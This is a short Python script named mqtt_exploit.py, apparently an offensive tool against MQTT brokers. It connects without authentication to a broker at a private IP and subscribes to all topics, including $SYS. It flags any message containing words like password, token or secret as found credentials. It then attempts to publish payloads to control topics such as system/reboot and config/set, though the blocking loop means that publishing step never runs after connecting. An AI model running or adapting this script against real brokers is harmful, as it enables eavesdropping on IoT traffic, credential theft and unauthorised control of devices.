#!/usr/bin/env python3
# mqtt_exploit.py
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, rc):
    print(f"[+] Connected with result code {rc}")
    # Subscribe to all topics
    client.subscribe("#")
    client.subscribe("$SYS/#")

def on_message(client, userdata, msg):
    print(f"\n[+] Topic: {msg.topic}")
    print(f"    Message: {msg.payload.decode()}")
    
    # Check for credentials
    payload_lower = msg.payload.decode().lower()
    if any(word in payload_lower for word in ['password', 'token', 'key', 'secret']):
        print(f"[!] CREDENTIALS FOUND in topic: {msg.topic}")

def mqtt_enumeration(broker_ip, port=1883):
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    
    try:
        client.connect(broker_ip, port, 60)
        client.loop_forever()
    except Exception as e:
        print(f"[-] Connection failed: {e}")
    
    # Try to publish commands
    topics_to_test = [
        "home/command",
        "device/control",
        "system/reboot",
        "config/set"
    ]
    
    for topic in topics_to_test:
        try:
            client.publish(topic, "TEST_PAYLOAD")
            print(f"[*] Published to {topic}")
        except:
            pass

# Usage
mqtt_enumeration("192.168.1.100", 1883)